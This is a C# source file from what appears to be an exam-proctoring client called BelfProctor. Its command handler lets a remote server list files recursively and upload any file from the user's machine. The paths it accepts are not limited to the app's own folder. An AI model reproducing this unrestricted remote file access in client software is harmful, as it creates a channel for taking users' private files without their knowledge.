using System.Text;
using Microsoft.Extensions.Options;
using Newtonsoft.Json;
using BelfProctor.Models;

namespace BelfProctor.Services;

public class CommandHandler
{
    private readonly ProctorSettings _settings;
    private readonly IDataTransmissionService _transmission;

    public CommandHandler(IOptions<ProctorSettings> settings, IDataTransmissionService transmission)
    {
        _settings = settings.Value;
        _transmission = transmission;
    }

    public async Task HandleAsync(Command cmd)
    {
        if (cmd.Type == "list")
        {
            var basePath = Environment.ExpandEnvironmentVariables(GetString(cmd.Payload, "basePath", "%LOCALAPPDATA%\\BelfProctor"));
            var pattern = GetString(cmd.Payload, "pattern", "*");
            var recursive = GetBool(cmd.Payload, "recursive", false);
            var maxEntries = GetInt(cmd.Payload, "maxEntries", 1000);

            var files = new List<object>();
            var opt = new EnumerationOptions { RecurseSubdirectories = recursive, IgnoreInaccessible = true, AttributesToSkip = FileAttributes.System | FileAttributes.Temporary };
            foreach (var path in Directory.EnumerateFiles(basePath, pattern, opt))
            {
                var info = new FileInfo(path);
                files.Add(new { name = info.Name, size = info.Length, lastWriteTime = info.LastWriteTimeUtc, fullPath = info.FullName });
                if (files.Count >= maxEntries) break;
            }

            var json = JsonConvert.SerializeObject(new { files });
            var bytes = Encoding.UTF8.GetBytes(json);
            await _transmission.SendCommandResultJsonAsync(cmd.Id, bytes);
            return;
        }

        if (cmd.Type == "file")
        {
            var path = Environment.ExpandEnvironmentVariables(GetString(cmd.Payload, "path", string.Empty));
            if (string.IsNullOrWhiteSpace(path) || !File.Exists(path)) return;
            await _transmission.SendCommandResultFileAsync(cmd.Id, path);
            return;
        }
    }

    private static string GetString(Dictionary<string, object> payload, string key, string def)
    {
        if (payload.TryGetValue(key, out var v) && v != null) return Convert.ToString(v) ?? def;
        return def;
    }

    private static bool GetBool(Dictionary<string, object> payload, string key, bool def)
    {
        if (payload.TryGetValue(key, out var v) && v != null)
        {
            if (v is bool b) return b;
            if (bool.TryParse(Convert.ToString(v), out var br)) return br;
        }
        return def;
    }

    private static int GetInt(Dictionary<string, object> payload, string key, int def)
    {
        if (payload.TryGetValue(key, out var v) && v != null)
        {
            if (v is int i) return i;
            if (int.TryParse(Convert.ToString(v), out var ir)) return ir;
        }
        return def;
    }
}